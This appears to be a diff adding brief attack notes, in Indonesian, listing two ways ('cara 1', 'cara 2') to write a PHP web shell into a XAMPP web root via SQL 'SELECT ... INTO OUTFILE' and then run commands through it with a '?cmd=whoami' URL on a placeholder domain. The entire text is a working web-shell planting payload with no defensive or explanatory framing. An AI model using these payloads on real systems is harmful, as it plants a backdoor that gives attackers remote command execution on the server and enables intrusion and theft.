@@ -1,0 +1,7 @@
+cara 1
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/assets.php';
+https://www.dummy.co.id/assets.php?cmd=whoami
+
+cara 2
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/assets.php';
+https://www.dummy.co.id/Web_Sci/assets.php?cmd=whoami
